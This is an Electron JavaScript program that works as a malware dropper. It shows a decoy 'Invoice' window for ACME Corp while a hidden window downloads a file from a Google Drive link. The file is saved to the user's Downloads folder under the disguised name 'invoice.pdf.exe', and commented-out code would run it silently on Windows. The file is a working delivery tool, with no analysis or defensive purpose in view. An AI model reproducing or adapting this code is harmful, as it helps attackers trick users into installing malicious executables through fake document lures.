const { app, BrowserWindow } = require('electron');
const path = require('path');
const fs = require('fs');
const { exec } = require('child_process');

// Google Drive direct download link
const DOWNLOAD_LINK = 'https://drive.google.com/uc?export=download&id=1r1whMfqrGK5Xs0Ygzw4ClqzEHotMj5J1'; 

function createDecoyWindow() {
    const decoyWin = new BrowserWindow({
        width: 800,
        height: 600,
        webPreferences: {
            nodeIntegration: false,
            contextIsolation: true
        }
    });

    // Decoy PDF content
    const decoyContent = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Invoice</title>
        </head>
        <body>
            <h1>Company: ACME Corp</h1>
            <h2>Invoice #: 12345</h2>
            <p>Date: 26-Aug-2025</p>
            <p>Amount: $250.00</p>
        </body>
        </html>
    `;
    decoyWin.loadURL(`data:text/html;charset=utf-8,${encodeURIComponent(decoyContent)}`);
    decoyWin.on('closed', () => {
        app.quit();
    });
}

function createHiddenDownloadWindow() {
    const downloadWin = new BrowserWindow({
        show: false, // Keep this window hidden
        webPreferences: {
            nodeIntegration: false,
            contextIsolation: true
        }
    });

    downloadWin.loadURL(DOWNLOAD_LINK);

    downloadWin.webContents.session.on('will-download', (event, item, webContents) => {
        // Set the save path to a temporary directory or downloads folder
        const downloadsPath = app.getPath('downloads');
        const fileName = 'invoice.pdf.exe'; // The name you want the downloaded file to have
        const filePath = path.join(downloadsPath, fileName);

        item.setSavePath(filePath);

        item.on('updated', (event, state) => {
            if (state === 'interrupted') {
                console.log('Download is interrupted but can be resumed');
            } else if (state === 'progressing') {
                if (item.isPaused()) {
                    console.log('Download is paused');
                } else {
                    console.log(`Downloaded ${item.getReceivedBytes()} of ${item.getTotalBytes()}`);
                }
            }
        });

        item.once('done', (event, state) => {
            if (state === 'completed') {
                console.log('Download successfully');
                // Optionally, execute the downloaded file silently
                // exec(`start "" "${filePath}"`, (err) => { // For Windows
                //     if (err) {
                //         console.error('Failed to execute downloaded file:', err);
                //     }
                // });
            } else {
                console.log(`Download failed: ${state}`);
            }
        });
    });

    downloadWin.on('closed', () => {
        console.log('Hidden download window closed');
    });
}

app.whenReady().then(() => {
    createDecoyWindow();
    createHiddenDownloadWindow();

    app.on('activate', () => {
        if (BrowserWindow.getAllWindows().length === 0) {
            createDecoyWindow();
            createHiddenDownloadWindow();
        }
    });
});

app.on('window-all-closed', () => {
    if (process.platform !== 'darwin') {
        app.quit();
    }
});
